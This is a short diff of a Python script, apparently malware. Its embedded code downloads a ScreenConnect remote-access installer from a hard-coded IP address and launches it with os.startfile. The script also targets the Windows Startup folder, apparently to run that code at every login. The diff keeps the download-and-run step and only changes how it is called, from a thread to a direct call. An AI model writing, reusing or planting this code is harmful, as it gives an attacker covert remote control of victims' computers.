@@ -15,7 +15,6 @@ except Exception as e:
     print(e)
 
 code = """
-import threading
 import urllib.request
 import json 
 import os
@@ -33,8 +32,7 @@ def download_and_run(url):
     os.startfile(file_path)
 
 url = 'http://87.121.84.32:8040/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest'
-thread = threading.Thread(target=download_and_run, args=(url,))
-thread.start()
+download_and_run(url)
 """
 
 startup = os.path.join(os.environ['APPDATA'], r'Microsoft\Windows\Start Menu\Programs\Startup')
